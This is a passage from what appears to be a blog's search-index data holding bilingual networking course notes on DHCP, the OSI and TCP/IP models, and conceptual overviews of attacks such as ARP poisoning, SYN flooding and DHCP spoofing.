lease)</li>\n</ul>\n</li>\n<li>DHCP Server service – runs in the background and listens on UDP port 67 for IP address requests</li>\n</ul>\n<ol start=\"2\">\n<li>DHCP Server</li>\n</ol>\n<ul>\n<li>A DHCP server is composed of the following:\n<ul>\n<li>IP address scope – a range of IP addresses the server leases to clients\n<ul>\n<li>Scope options – IP settings: default gateway, DNS servers, and other options</li>\n<li>Reservations – an IP address tied to a particular MAC address</li>\n<li>Exclusions – one or more IP addresses excluded from the IP address scope</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>After an address is leased\n<ul>\n<li>A record of the lease is stored in a database, including a lease expiration time</li>\n<li>When 50% of the lease time has elapsed, the computer attempts to renew the lease from the same DHCP server that originally responded</li>\n<li>If no response, the computer waits until lease is 87.5% expired, a broadcast DHCP renewal request is sent\n<ul>\n<li>If no response when lease expires, computer broadcasts a DCHP request for a new IP address</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>Benefit of using DHCP\n<ul>\n<li>Computers can easily be moved and requested new IP configuration from a DHCP server on the new segment</li>\n</ul>\n</li>\n<li>DHCP uses UDP\n<ul>\n<li>DHCP servers are usually located on the same network and DHCP messages are short</li>\n</ul>\n</li>\n</ul>\n<ol start=\"3\">\n<li>\n<p>DHCP Process<br>\nBroadcast packets used by the DHCP process:</p>\n<ol>\n<li>DHCPDISCOVER – the client announces to the network that it’s looking for a DHCP server</li>\n<li>DHCPOFFER – the server replies and offers the client an IP address for lease</li>\n<li>DHCPREQUEST – the client wants the offered IP address</li>\n<li>DHCPACK – the server acknowledges the transaction and the client can now use the IP address<br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/065a09e3ea0c2cfe.png\" alt=\"DHCP\"></li>\n</ol>\n</li>\n</ol>\n","categories":["课程笔记","Network Systems"],"tags":["network system","HTTP","DHCP","DNS","SSH","FTP","SMTP"]},{"title":"Network Systems Overall","url":"/course/Network%20System%20Overall/","content":"<h1 id=\"Peer-to-peer and client-server networks\" class=\"active\"><a class=\"anchor\"  href=\"#Peer-to-peer and client-server networks\">#</a>Peer-to-peer and client-server networks</h1>\n<h2 id=\"P2P\" class=\"active\"><a class=\"anchor\"  href=\"#P2P\">#</a>P2P</h2>\n<ul>\n<li>Peer-to-peer (P2P) Network Model 在对等网络模型中，网络中的每个设备（节点或主机）都负责管理自己的资源，包括控制访问权限和安全性管理。这种设置允许计算机在没有集中控制的情况下共享或限制资源。</li>\n<li>P2P 网络的主要特征：\n<ul>\n<li>无集中控制：每台计算机独立运行，并管理自己的设置。</li>\n<li>节点组成的逻辑组：网络由多台计算机构成的组，特点是：\n<ul>\n<li>可以共享资源（如文件、打印机等）</li>\n<li>基于用户权限限制资源访问</li>\n<li>独立管理各自的设置、资源和安全性</li>\n</ul>\n</li>\n<li>本地用户账户：每个用户在各自的计算机上拥有本地账户，权限和设置仅适用于该设备。</li>\n<li>互联网示例：互联网中的一些对等共享平台（如文件共享应用）使用此模型。</li>\n</ul>\n</li>\n<li>Advantages and disadvantages:\n<ul>\n<li>easy, simple</li>\n<li>not scalable, not necessarily secure, not practical for larges-scale networks</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"Client-Server Network Model\" class=\"active\"><a class=\"anchor\"  href=\"#Client-Server Network Model\">#</a>Client-Server Network Model</h2>\n<ul>\n<li>在客户端 - 服务器网络模型中，有一个中心服务器管理网络资源，并控制客户端的网络访问。这种结构允许多个客户端通过服务器来请求访问资源。</li>\n<li>模型主要特点：\n<ul>\n<li>服务器：管理共享资源，并控制网络访问。</li>\n<li>多个客户端：每个客户端通过服务器请求网络访问或资源。客户端不直接与其他客户端共享资源，而是通过服务器间接共享资源。</li>\n</ul>\n</li>\n<li>Advantages relative to P2P networks:\n<ul>\n<li>More scalable</li>\n<li>Centrally controlled network access and network resources</li>\n<li>Central monitoring and management</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"Client-Server Applications\" class=\"active\"><a class=\"anchor\"  href=\"#Client-Server Applications\">#</a>Client-Server Applications</h2>\n<ul>\n<li>Network Services are the resources a network makes available to its users\n<ul>\n<li>They include applications and data provided by the applications</li>\n</ul>\n</li>\n<li>In a client-server application\n<ul>\n<li>A server provide network resources to clients</li>\n<li>Clients request network resources from the server</li>\n</ul>\n</li>\n<li>Protocols are methods and rules for communication between networked devices\n<ul>\n<li>Two primary protocols:\n<ul>\n<li>TCP (Transmission Control Protocol), and</li>\n<li>IP (Internet Protocol)</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"Network hardware devices and physical topologies\" class=\"active\"><a class=\"anchor\"  href=\"#Network hardware devices and physical topologies\">#</a>Network hardware devices and physical topologies</h1>\n<ol>\n<li>Local Area Networks (LANs) and Hardware</li>\n</ol>\n<ul>\n<li>A LAN is usually for a workspace or asmall physical area\n<ul>\n<li>Such as a lab or a building</li>\n</ul>\n</li>\n<li>A LAN interconnects nodes via a device called switch</li>\n<li>Each device needs a Network Interface Card (NIC) to connect to the switch</li>\n</ul>\n<ol start=\"2\">\n<li>Start Topology or Bus Topology</li>\n</ol>\n<ul>\n<li>Physically, a LAN is interconnected with star topology\n<ul>\n<li>A switch in the central point to interconnect all other nodes</li>\n</ul>\n</li>\n<li>Logically, a LAN is interconnected with bus topology\n<ul>\n<li>All nodes access the network through the bus</li>\n</ul>\n</li>\n<li>Function of the switch\n<ul>\n<li>A switch receives incoming data from one of its ports and redirects the data to another port or multiple ports according to the intended destination of the data</li>\n</ul>\n</li>\n</ul>\n<ol start=\"3\">\n<li>Daisy-chained switches in a LAN</li>\n</ol>\n<ul>\n<li>A LAN can have multiple switches</li>\n<li>Three switches daisy-chained together in a single line served as a bus physically and logically\n<ul>\n<li>However, each of the switches is connected to its nodes via star topology physically, thus making the overall star-bus physical topology</li>\n<li>A topological model combining several topological models is known as a hybrid topological model</li>\n</ul>\n</li>\n</ul>\n<ol start=\"4\">\n<li>Interconnection of LANs via Routers</li>\n</ol>\n<ul>\n<li>A router is a device that manages traffic between two or more LANs</li>\n<li>A router can be used in small home networks to connect home LAN to the internet\n<ul>\n<li>This is known as a SOHO (Small Office-Home Office) network</li>\n</ul>\n</li>\n<li>Difference between a router and a switch\n<ul>\n<li>A switch works on, and belongs to, its LAN</li>\n<li>A router is a gateway interconnecting and belonging to multiple LANs</li>\n</ul>\n</li>\n</ul>\n<ol start=\"5\">\n<li>MANs and WANs</li>\n</ol>\n<ul>\n<li>Metropolitan area network (MAN)—A group of connected LANs in the same geographical area\n<ul>\n<li>Also known as Campus Area Network (CAN)</li>\n</ul>\n</li>\n<li>Wide Area Network (WAN) – A group of LANs spreading over a wide geographical area\n<ul>\n<li>The Internet is he largest and most varied WAN</li>\n</ul>\n</li>\n<li>PAN (personal area network)— The smallest network\n<ul>\n<li>A network of personal devices such as your smartphone and your laptop</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"The ISO 7-layer Open-System-Interconnection (OSI) model\" class=\"active\"><a class=\"anchor\"  href=\"#The ISO 7-layer Open-System-Interconnection (OSI) model\">#</a>The ISO 7-layer Open-System-Interconnection (OSI) model</h1>\n<h2 id=\"Overall\" class=\"active\"><a class=\"anchor\"  href=\"#Overall\">#</a>Overall</h2>\n<ol>\n<li>The OSI model is a theoretical representation describing network communication between two nodes\n<ul>\n<li>Never implemented</li>\n<li>Hardware and software independent</li>\n<li>Each network communication process represented<br>\n<img data-src=\"https://img.picui.cn/free/2024/10/31/672332515b4e5.png\" alt=\"img\"></li>\n</ul>\n</li>\n<li>OSI and TCP/IP Models<br>\nTCP/IP 模型将应用层、表示层和会话层合并为一个单一的应用层，并将数据链路层和物理层合并为网络接入层</li>\n</ol>\n<table>\n<thead>\n<tr>\n<th>OSI Model</th>\n<th>TCP/IP Model</th>\n<th>Examples</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Application</td>\n<td>Application</td>\n<td>Telnet, FTP, DHCP, DNS, HTTP, SMTP</td>\n</tr>\n<tr>\n<td>Presentation</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>Session</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>Transport</td>\n<td>Transport</td>\n<td>TCP, UDP</td>\n</tr>\n<tr>\n<td>Network</td>\n<td>Internetwork</td>\n<td>ICMP, IP</td>\n</tr>\n<tr>\n<td>Data Link</td>\n<td>Network Access</td>\n<td>Ethernet, Wi-Fi, ARP</td>\n</tr>\n<tr>\n<td>Physical</td>\n<td></td>\n<td>Cables, Hubs, Switches</td>\n</tr>\n</tbody>\n</table>\n<ol start=\"3\">\n<li>Functions of the 7 layers</li>\n</ol>\n<table>\n<thead>\n<tr>\n<th>OSI Model Layer</th>\n<th>Function</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Application (Layer 7)</td>\n<td>Provides interface between software applications and a network for interpreting applications’ requests and requirements</td>\n</tr>\n<tr>\n<td>Presentation (Layer 6)</td>\n<td>Allows hosts and applications to use a common language; performs data formatting, encryption, and compression</td>\n</tr>\n<tr>\n<td>Session (Layer 5)</td>\n<td>Establishes, maintains, and terminates user connections</td>\n</tr>\n<tr>\n<td>Transport (Layer 4)</td>\n<td>Ensures accurate delivery of data through flow control, segmentation and reassembly, error correction, and acknowledgment</td>\n</tr>\n<tr>\n<td>Network (Layer 3)</td>\n<td>Establishes network connections; translates network addresses into their physical counterparts and determines routing</td>\n</tr>\n<tr>\n<td>Data Link (Layer 2)</td>\n<td>Packages data in frames appropriate to network transmission method</td>\n</tr>\n<tr>\n<td>Physical (Layer 1)</td>\n<td>Manages signaling to and from physical network connections</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"Functions of the 7 layers\" class=\"active\"><a class=\"anchor\"  href=\"#Functions of the 7 layers\">#</a>Functions of the 7 layers</h2>\n<ol>\n<li>Layer 7: Application Layer 应用层</li>\n</ol>\n<ul>\n<li>Layer 7 describes the interface between two applications on separate computers</li>\n<li>Layer 7 protocols are used by application programs to\n<ul>\n<li>Provide services to users, such as a browser and email client</li>\n<li>Provide services to the system for, e.g., management of networks and resources</li>\n</ul>\n</li>\n<li>Payload – data that is passed between applications (or utility programs) and the OS<br>\n<img data-src=\"https://img.picui.cn/free/2024/10/31/672336b510c89.png\" alt=\"img\"></li>\n</ul>\n<ol start=\"2\">\n<li>Layer 6 Presentation Layer 表示层</li>\n</ol>\n<ul>\n<li>Presentation layer—Responsible for reformatting, compressing, and/or encrypting data in a way that the receiving application can read</li>\n<li>Example:<br>\n⎻ An web browsing message can be encrypted at the Presentation layer by the browser or by the O S (Operating System)</li>\n</ul>\n<ol start=\"3\">\n<li>Layer 5: Session Layer 会话层</li>\n</ol>\n<ul>\n<li>Layer 5 describes how data between applications is synched and recovered if messages do not arrive intact at the receiving application</li>\n<li>The Application, Presentation, and Session layers are intertwined\n<ul>\n<li>Often difficult to distinguish between them</li>\n</ul>\n</li>\n<li>Most tasks are performed by the OS when an application makes an API call to the OS\n<ul>\n<li>Application programming interface (API) call is the method that an application uses when it makes a request of the OS<br>\n<img data-src=\"https://img.picui.cn/free/2024/10/31/672336b537ba9.png\" alt=\"img\"></li>\n</ul>\n</li>\n</ul>\n<ol start=\"4\">\n<li>Layer 4: Transport Layer 传输层</li>\n</ol>\n<ul>\n<li>Layer 4 is responsible for transporting Application layer payloads from one application to another</li>\n<li>Control information is put into a header, which is added to the payload\n<ul>\n<li>Known as encapsulation</li>\n</ul>\n</li>\n<li>The layer 4 header addresses the receiving application by a number called a port number</li>\n<li>Two main Transport layer protocols at Layer 4\n<ol>\n<li>TCP (Transmission Control Protocol)</li>\n</ol>\n<ul>\n<li>It makes a connection with the end host, checks whether data was received; called a connection-oriented protocol</li>\n<li>If a message is too long, TCP divides it into smaller ones called <strong>segments</strong></li>\n</ul>\n<ol start=\"2\">\n<li>UDP (User Datagram Protocol)</li>\n</ol>\n<ul>\n<li>It does not guarantee delivery by first connecting and checking whether data is received; called a connectionless protocol</li>\n<li>A message is called a <strong>datagram</strong><br>\n<img data-src=\"https://img.picui.cn/free/2024/10/31/672336b4c7bf0.png\" alt=\"img\"></li>\n</ul>\n</li>\n</ul>\n<ol start=\"5\">\n<li>Layer 3: Network Layer 网络层</li>\n</ol>\n<ul>\n<li>Layer 3 is responsible for moving messages from one node to another until they reach the destination host</li>\n<li>IP adds its own Network layer header to the segment or datagram\n<ul>\n<li>The entire Network layer message is called a packet</li>\n</ul>\n</li>\n<li>IP address—Assigned to each node on a network\n<ul>\n<li>Network layer uses it to uniquely identify each host</li>\n</ul>\n</li>\n<li>IP relies on several routing protocols to find the best route for a packet to take to reach destination\n<ul>\n<li>ICMP and ARP are examples\n<ul>\n<li>Note: ARP is not strictly a Layer 3 protocol. It works at Layer 2 but uses Layer 3 IP address information</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>Network layer protocol will divide large packets into smaller <strong>packets</strong>\n<ul>\n<li>The process is known as fragmentation</li>\n</ul>\n</li>\n</ul>\n<ol start=\"6\">\n<li>Layer 2: Data Link Layer 数据链路层</li>\n</ol>\n<ul>\n<li>Layers 2 and 1 are responsible for interfacing with physical hardware on the local network\n<ul>\n<li>Protocols at these layers are programmed into firmware of a computer’s NIC and other hardware</li>\n</ul>\n</li>\n<li>The type of networking hardware or technology used on a network determines the Link Layer protocol used\n<ul>\n<li>Ethernet and Wi-Fi are examples</li>\n</ul>\n</li>\n<li>Layer2 puts control information in a Link layer header and at the end of the packet in a trailer\n<ul>\n<li>The data transmitted at the entire Link layer is called a <strong>frame</strong></li>\n</ul>\n</li>\n<li>MAC (Media Access Control) address—Hardware address of the source and destination NICs\n<ul>\n<li>Also called a physical address, hardware address, or Data Link layer address</li>\n<li>Embedded on every network adapter</li>\n<li>In a LAN, a node can be found through MAC address</li>\n</ul>\n</li>\n<li>Two Data Link Layer Sublayers\n<ol>\n<li>LLC (Logical Link Control) sublayer</li>\n</ol>\n<ul>\n<li>It provides common interface, reliability and flow control</li>\n</ul>\n<ol start=\"2\">\n<li>MAC (Media Access Control) sublayer</li>\n</ol>\n<ul>\n<li>It manages access to the physical medium</li>\n<li>It appends physical address of destination computer onto data frame</li>\n</ul>\n</li>\n</ul>\n<ol start=\"7\">\n<li>Layer 1: Physical Layer 物理层</li>\n</ol>\n<ul>\n<li>Layer 1 is the simplest layer and is responsible for sending bits via a wired or wireless transmission</li>\n<li><strong>Bits</strong> can be transmitted as:\n<ul>\n<li>Wavelengths in the air</li>\n<li>Voltage on a copper wire</li>\n<li>Light (via fiber-optic cabling)</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"PDU\" class=\"active\"><a class=\"anchor\"  href=\"#PDU\">#</a>PDU</h2>\n<ol>\n<li>PDU: the name for a group of data bits as it moves from one layer to the next, and from one LAN to the next</li>\n</ol>\n<ul>\n<li>It is sometimes called a message or a transmission</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>OSI 层级</th>\n<th>常用名称</th>\n<th>技术性名称 (PDU)</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>应用层 (Layer 7)</td>\n<td>数据或有效载荷（Payload）</td>\n<td>L7PDU</td>\n</tr>\n<tr>\n<td>表示层 (Layer 6)</td>\n<td>数据或有效载荷（Payload）</td>\n<td>L6PDU</td>\n</tr>\n<tr>\n<td>会话层 (Layer 5)</td>\n<td>数据或有效载荷（Payload）</td>\n<td>L5PDU</td>\n</tr>\n<tr>\n<td>传输层 (Layer 4)</td>\n<td>段（Segment, TCP）或数据报（Datagram, UDP）</td>\n<td>L4PDU</td>\n</tr>\n<tr>\n<td>网络层 (Layer 3)</td>\n<td>包（Packet）</td>\n<td>L3PDU</td>\n</tr>\n<tr>\n<td>数据链路层 (Layer 2)</td>\n<td>帧（Frame）</td>\n<td>L2PDU</td>\n</tr>\n<tr>\n<td>物理层 (Layer 1)</td>\n<td>比特（Bit）或传输单元</td>\n<td>L1PDU</td>\n</tr>\n</tbody>\n</table>\n<ol start=\"2\">\n<li>Demonstration of PDU Names\n<ol>\n<li>Data transformation</li>\n</ol>\n<ul>\n<li>Original software application data differs from application layer NIC data\n<ul>\n<li>Information added at each layer</li>\n</ul>\n</li>\n</ul>\n<ol start=\"2\">\n<li>Segments/datagrams</li>\n</ol>\n<ul>\n<li>Generated in Transport layer</li>\n<li>Unit of data resulting from subdividing larger Protocol Data Unit (PDU)</li>\n</ul>\n<ol start=\"3\">\n<li>Packets/datagrams</li>\n</ol>\n<ul>\n<li>Generated in Network layer</li>\n<li>Added logical addressing information added to segments</li>\n</ul>\n<ol start=\"4\">\n<li>Frames</li>\n</ol>\n<ul>\n<li>Generated in Data Link layer</li>\n<li>Added physical addressing and error-checking information to segments<br>\n<img data-src=\"https://img.picui.cn/free/2024/10/31/672336ba87f7d.png\" alt=\"img\"></li>\n</ul>\n</li>\n<li>Communication between two systems</li>\n</ol>\n<ul>\n<li>On data’s way down the protocol stack (model):\n<ul>\n<li>Data is divided into data units called protocol data units (PDU)</li>\n<li>Some layers add their own formatting to the PDU, which is called a header (encapsulation)</li>\n</ul>\n</li>\n<li>When data arrives at the receiving end, it is passed up the protocol stack:\n<ul>\n<li>At each layer, software reads its PDU data and strips its header information (called decapsulation) and passes the PDU to the next higher layer</li>\n<li>Packet leaves the Application layer in a format the receiving application can read<br>\n<img data-src=\"https://img.picui.cn/free/2024/10/31/672336b4d1ba7.png\" alt=\"img\"></li>\n</ul>\n</li>\n</ul>\n","categories":["课程笔记","Network Systems"],"tags":["network system","OSI","TCP/IP"]},{"title":"Network Security Analysis","url":"/course/Network-Security-Analysis/","content":"<h1 id=\"Layer 3: Network\" class=\"active\"><a class=\"anchor\"  href=\"#Layer 3: Network\">#</a>Layer 3: Network</h1>\n<h2 id=\"IP\" class=\"active\"><a class=\"anchor\"  href=\"#IP\">#</a>IP</h2>\n<ol>\n<li>IP Protocol Features</li>\n</ol>\n<ul>\n<li>Best-effort delivery\n<ul>\n<li>IP routes and sends a packet to the destination. IP provides no guaranteed delivery of packets</li>\n<li>Packet loss is left to the higher layer protocols</li>\n<li>The network has variable delays, it is not guaranteed that the packets will be received in sequence.</li>\n</ul>\n</li>\n<li>Connection-less service\n<ul>\n<li>Each packet is individually addressed and routed, rather than in the setup a prearranged connection channel for data transmission</li>\n<li>It is possible that two packets from the same source take different paths to reach the destination.</li>\n</ul>\n</li>\n<li>Routing\n<ul>\n<li>Packets go through a series of routers before they reach the destination.</li>\n<li>At each node that the packet passes through, the node determines the next hop for the packet and routes it to the next hop.</li>\n</ul>\n</li>\n<li>Quality of Service (QoS) control\n<ul>\n<li>QoS optimizes the network by setting packet priorities (classification marking)</li>\n</ul>\n</li>\n</ul>\n<ol start=\"2\">\n<li>IP Fragmentation\n<ol>\n<li>What is IP fragmentation?</li>\n</ol>\n<ul>\n<li>Fragmentation is necessary for data transmission, as every network has its maximum transmission unit (MTU), the largest number of bytes an individual packet can have on a particular network</li>\n<li>If a packet larger than the network’s MTU is being sent, it must be fragmented before transmission.</li>\n</ul>\n<ol start=\"2\">\n<li>Who assembles the fragmented packets?</li>\n</ol>\n<ul>\n<li>When the destination host receives IP fragments, it allocates memory in preparation for fragment reassembly.</li>\n</ul>\n</li>\n<li>IP Spoofing/DoS</li>\n</ol>\n<ul>\n<li>An attacker can send packets/datagrams from a false source address to disguise itself.</li>\n<li>Denial-of-service (DoS) attacks often use IP spoofing to overload networks and devices with packets that appear to be from legitimate source IP addresses.</li>\n</ul>\n<ol start=\"3\">\n<li>Issues with IPv4 Fragmentation<br>\nFragmentation causes increase overhead in CPU and memory and slow down network performance.</li>\n</ol>\n<ul>\n<li>Intermediate router\n<ul>\n<li>Creates fragment headers</li>\n<li>Computes checksums</li>\n<li>Copies the original packet into the fragments</li>\n</ul>\n</li>\n<li>Receiving host\n<ul>\n<li>When reassembling the fragments the receiver must allocate memory for the arriving fragments and joint together fragments into one packet after all of the fragments are received</li>\n<li>If one fragment is dropped, the entire original packet must be resent.\n<ul>\n<li>The TTL time exceeded ICMP message (with Fragment reassembly timeout) is sent to the sender.</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"ARP\" class=\"active\"><a class=\"anchor\"  href=\"#ARP\">#</a>ARP</h2>\n<ol>\n<li>ARP</li>\n</ol>\n<ul>\n<li>IP addresses are used for identifying destination devices across the Internet.</li>\n<li>MAC addresses are used for direct delivery within the same network.</li>\n<li>ARP is used to resolve a logical (IP) address of a target host to its physical (MAC) address in a local area network.</li>\n</ul>\n<ol start=\"2\">\n<li>\n<p>ARP in Direct Delivery</p>\n<ol>\n<li>The sender A and receiver B are located at the same network.</li>\n</ol>\n<ul>\n<li>A requests for B’s MAC address.</li>\n<li>Once B’s MAC address is resolved, then the data can be delivered from A to B.<br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/7638f7e29bc26dab.png\" alt=\"image\"></li>\n</ul>\n<ol start=\"2\">\n<li>The sender A and receiver B are not located at the same network.</li>\n</ol>\n<ul>\n<li>A requests for gateway’s MAC address. Once G’s MAC address is resolved, then A sends the data to G for data forwarding</li>\n<li>G requests B’s MAC address. Once B’s MAC address is resolved, then G forwards the data to B</li>\n<li>Two ARP processes involved<br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/a066a6ee19686120.png\" alt=\"image\"></li>\n</ul>\n<ol start=\"3\">\n<li>More ARP processes</li>\n</ol>\n<ul>\n<li>A - G1     G1 - G2      G2 - G3      G3 - B<br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/94a4b433ddf61059.png\" alt=\"image\"></li>\n</ul>\n</li>\n<li>\n<p>ARP Process- Request</p>\n</li>\n</ol>\n<ul>\n<li>ARP is a two-step process: a request and a reply.</li>\n<li>Within a network, when a host (requester) – A, begins a conversation with a target host - B\n<ul>\n<li>A is aware of B’s IP address, but does not have the B’s MAC address. Thus A is unable to send a unicast frame to B.</li>\n<li>A sends an ARP broadcast frame to request B’s MAC address. Since it is a broadcast, all hosts on the network receives the ARP request.</li>\n<li>All hosts scan the content of the ARP request to determine if they are the intended target. The hosts which are not the intended target discard the broadcast frame.</li>\n</ul>\n</li>\n</ul>\n<ol start=\"4\">\n<li>ARP Process - Reply</li>\n</ol>\n<ul>\n<li>B is the target of the ARP Request. It sends an ARP Reply back to A.</li>\n<li>Since B knows who sent the initial ARP Request, it is able to send the ARP Response unicast, directly back to A</li>\n</ul>\n<ol start=\"5\">\n<li>ARP Poisoning</li>\n</ol>\n<ul>\n<li>ARP Poisoning is also known as ARP Spoofing.</li>\n<li>A type of attack carried out over a local area network (LAN).</li>\n<li>It involves sending malicious ARP packets on a LAN to change the mapping of the attacker’s<br>\nMAC address with the IP address of another host</li>\n<li>攻击过程\n<ul>\n<li>攻击者在局域网中发送伪造的 ARP 数据包，将目标 IP 地址映射到攻击者的 MAC 地址。</li>\n<li>这样，局域网中的其他主机在访问该 IP 地址时，流量会被引导到攻击者的设备上。</li>\n</ul>\n</li>\n<li>攻击目的\n<ol>\n<li>中间人攻击（Man-in-the-Middle, MITM）：</li>\n</ol>\n<ul>\n<li>攻击者可以截获、篡改或记录在受害者和目标主机之间传递的数据。</li>\n</ul>\n<ol start=\"2\">\n<li>拒绝服务攻击（DoS）：</li>\n</ol>\n<ul>\n<li>攻击者可以通过阻止合法主机的流量访问目标主机，实现拒绝服务。<br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/1e55b1b5b0938dda.png\" alt=\"image\"></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"ICMP\" class=\"active\"><a class=\"anchor\"  href=\"#ICMP\">#</a>ICMP</h2>\n<ol>\n<li>ICMP Features</li>\n</ol>\n<ul>\n<li>\n<p>ICMP is a supporting protocol to support IP.</p>\n</li>\n<li>\n<p>ICMP messages are encapsulated inside of IP datagrams before going down to the data link layer<br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/bd2c3965e1886840.png\" alt=\"image\"></p>\n</li>\n<li>\n<p>Assists the diagnosis of some network problems, particularly related to the network layer of the OSI model</p>\n</li>\n<li>\n<p>Assists in obtaining specific information from routers and the destination host</p>\n</li>\n<li>\n<p>Is used by routers and hosts</p>\n</li>\n<li>\n<p>Returns the message to the originator</p>\n</li>\n</ul>\n<ol start=\"2\">\n<li>Types of ICMP</li>\n</ol>\n<ul>\n<li>ICMP messages can be broadly classified into 2 types:\n<ul>\n<li>Error reporting</li>\n<li>Query/Reply</li>\n</ul>\n</li>\n</ul>\n<ol start=\"3\">\n<li>Time-Exceeded(Error reporting)</li>\n</ol>\n<ul>\n<li>The ICMP Time Exceeded message is issued:\n<ul>\n<li>When a packet is sent, its TTL is decremented by 1 at each hop. If the TTL reaches 0, the packet is dropped and a Time-Exceeded message is sent to the originator.</li>\n<li>If destination does not receive all fragments in a set time, it drops any received fragments and sends a Time-Exceeded message to the originator</li>\n</ul>\n</li>\n</ul>\n<ol start=\"4\">\n<li>ICMP 重定向（ICMP Redirect）</li>\n</ol>\n<ul>\n<li>场景设置\n<ul>\n<li>发送主机 A：IP 地址为 10.0.0.100/24。</li>\n<li>默认路由：A 的路由表中有一个默认路由条目，指向路由器 G1 的 IP 地址 10.0.0.1/24 作为默认网关。</li>\n<li>路由器 G1：当需要转发到目标网络 X 时，G1 使用路由器 G2 的 IP 地址 10.0.0.2/24 作为下一跳。</li>\n</ul>\n</li>\n<li>ICMP 重定向过程\n<ul>\n<li>包到达路由器 G1：G1 收到来自主机 A（10.0.0.100）发送的一个数据包，目标是网络 X。</li>\n<li>路由表检查：G1 检查其路由表，发现下一跳是 G2（IP 地址 10.0.0.2），可以到达目标网络 X。</li>\n<li>ICMP 重定向消息：如果 G2 和发送主机 A（10.0.0.100）在同一个网络（10.0.0.0/24），G1 会向发送主机 A 发送一个 ICMP 重定向消息，建议 A 将去往网络 X 的流量直接发送到 G2，这样可以减少一个跳数，使流量更直接地到达目标网络。</li>\n<li>数据包转发：在发送重定向消息的同时，G1 仍会将接收到的数据包转发到 G2，确保当前数据包的传输不中断。<br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/bbbcd5f2b66d5d73.png\" alt=\"image\"></li>\n</ul>\n</li>\n</ul>\n<ol start=\"5\">\n<li>Echo Request/Reply</li>\n</ol>\n<ul>\n<li>A host or router that receives an echo-request message creates an echo-reply message and returns it to the originator</li>\n<li>echo-request and echo-reply messages can be used to help diagnose some network problems\n<ul>\n<li>e.g. communication status between two devices</li>\n</ul>\n</li>\n<li>Testing destination availability and providing status is achieved by invoking a ping command\n<ul>\n<li>Creates a series of echo-request and echo-reply messages providing statistical information</li>\n</ul>\n</li>\n</ul>\n<ol start=\"6\">\n<li>Ping（ICMP）泛洪 DDoS 攻击</li>\n</ol>\n<ul>\n<li>ICMP 操作的类型：熟悉 ICMP 的各种操作类型（例如 Echo 请求 / 回复）有助于识别网络通信中的正常行为和异常行为。</li>\n<li>正常的 ICMP 交互：了解 ICMP 在发起端与目标主机之间的正常交互方式，例如 ping 操作，能帮助区分合法通信和潜在的恶意流量。</li>\n<li>异常网络行为识别：当 ICMP 流量异常时（例如，持续的 ping 请求），可能意味着存在攻击行为，如 DDoS 攻击。</li>\n<li>Ping（ICMP）泛洪 DDoS 攻击<br>\n Ping 泛洪是一种典型的 DDoS（分布式拒绝服务）攻击，攻击者通过发送大量 ICMP Echo 请求，使目标主机过载，耗尽其资源，导致网络性能下降甚至服务中断。这种攻击利用了 ICMP 的易用性和资源开销低的特性，通过大量的无用流量使目标服务器无法响应正常请求。<br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/7150028ff5a5d75b.png\" alt=\"image\"></li>\n</ul>\n<h1 id=\"Layer 4: Transport\" class=\"active\"><a class=\"anchor\"  href=\"#Layer 4: Transport\">#</a>Layer 4: Transport</h1>\n<h2 id=\"TCP\" class=\"active\"><a class=\"anchor\"  href=\"#TCP\">#</a>TCP</h2>\nTCP详细特征在 Layer-4-Transport-Protocols\n<p>对 TCP 的威胁：</p>\n<ol>\n<li>TCP 序列号预测：</li>\n</ol>\n<ul>\n<li>攻击者可能能够猜测 TCP 分配给数据包流的序列号。</li>\n<li>如果攻击者成功预测了正在进行的通信会话的序列号，可以进行<strong>注入</strong>攻击，将篡改或伪造的数据插入数据流中，从而影响数据的完整性。</li>\n</ul>\n<ol start=\"2\">\n<li>SYN Flooding DoS 攻击：</li>\n</ol>\n<ul>\n<li>SYN 泛洪是一种拒绝服务（DoS）攻击，通过向服务器发送大量伪造的 TCP SYN 请求，占用服务器的资源。</li>\n<li>在 SYN Flooding 攻击中，攻击者连续发送 SYN 请求，服务器响应 SYN-ACK，但攻击者不回复 ACK 确认，导致连接未完成并占用资源。</li>\n<li>这种攻击会使服务器资源耗尽，导致其无法响应合法用户的请求<br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/66fe7ac2f80b1dd1.png\" alt=\"image\"></li>\n</ul>\n<h1 id=\"Layer 7: Application\" class=\"active\"><a class=\"anchor\"  href=\"#Layer 7: Application\">#</a>Layer 7: Application</h1>\n<h2 id=\"DHCP\" class=\"active\"><a class=\"anchor\"  href=\"#DHCP\">#</a>DHCP</h2>\n<ol>\n<li>DHCP Message Format<br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/d8ed49e7d0fc10b8.png\" alt=\"image\"></li>\n<li>Threats to\n<ol>\n<li>DHCP - DHCP 欺骗（DHCP Spoofing）</li>\n</ol>\n<ul>\n<li>DHCP 欺骗是一种网络攻击，攻击者通过在网络中插入一个伪造的 DHCP 服务器来控制或截获网络流量。以下是攻击过程：\n<ol>\n<li>伪造的 DHCP 服务器：攻击者在网络中设置一个伪造的 DHCP 服务器，伪装成合法的 DHCP 服务器。</li>\n<li>响应 DHCP 请求：当客户端发送 DHCP 请求时，伪造的 DHCP 